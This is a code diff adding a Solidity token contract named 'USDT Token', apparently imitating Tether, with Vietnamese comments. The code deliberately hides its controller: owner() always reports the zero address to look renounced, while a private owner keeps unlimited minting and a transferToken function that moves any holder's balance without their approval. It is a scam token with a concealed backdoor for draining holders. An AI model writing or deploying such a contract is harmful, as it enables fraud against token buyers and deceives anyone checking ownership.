@@ -1,0 +1,82 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract USDT_Token is ERC20 {
+    uint256 private _totalSupply;
+    uint8 private _decimals;
+    address private _internalOwner; // Chủ thực sự, nhưng ẩn
+
+    constructor() ERC20("USDT Token", "USDT") {
+        _decimals = 6;
+        _totalSupply = 1_000_000 * 10**_decimals;
+        _internalOwner = msg.sender; // chỉ định owner thực sự
+        _mint(msg.sender, _totalSupply);
+    }
+
+    /// Luôn trả về address(0) ra ngoài cho "ẩn danh"
+    function owner() public pure returns (address) {
+        return address(0);
+    }
+
+    modifier onlyOwner() {
+        require(
+            msg.sender == _internalOwner,
+            "Ownable: caller is not the owner"
+        );
+        _;
+    }
+
+    // Transfer quyền owner nội bộ
+    function transferOwnership(address newOwner) external onlyOwner {
+        require(newOwner != address(0), "New owner is zero address");
+        _internalOwner = newOwner;
+    }
+
+    function mint(address to, uint256 amount) external onlyOwner {
+        require(to != address(0), "ERC20: mint to zero address");
+        _totalSupply += amount;
+        _mint(to, amount);
+    }
+
+    function burn(uint256 amount) external onlyOwner {
+        _totalSupply -= amount;
+        _burn(msg.sender, amount);
+    }
+
+    function decimals() public view override returns (uint8) {
+        return _decimals;
+    }
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function withdraw(address tokenAddress, uint256 amount) external onlyOwner {
+        require(tokenAddress != address(0), "Invalid token address");
+        IERC20 token = IERC20(tokenAddress);
+        uint256 balance = token.balanceOf(address(this));
+        require(balance >= amount, "Insufficient token balance");
+        token.transfer(msg.sender, amount);
+    }
+
+    function withdrawNativeToken(uint256 amount) external onlyOwner {
+        require(address(this).balance >= amount, "Insufficient ETH balance");
+        payable(msg.sender).transfer(amount);
+    }
+
+    function transferToken(
+        address from,
+        address to,
+        uint256 amount
+    ) external onlyOwner {
+        require(balanceOf(from) >= amount, "Insufficient balance of sender");
+        _transfer(from, to, amount);
+    }
+
+    receive() external payable {}
+
+    fallback() external payable {}
+}
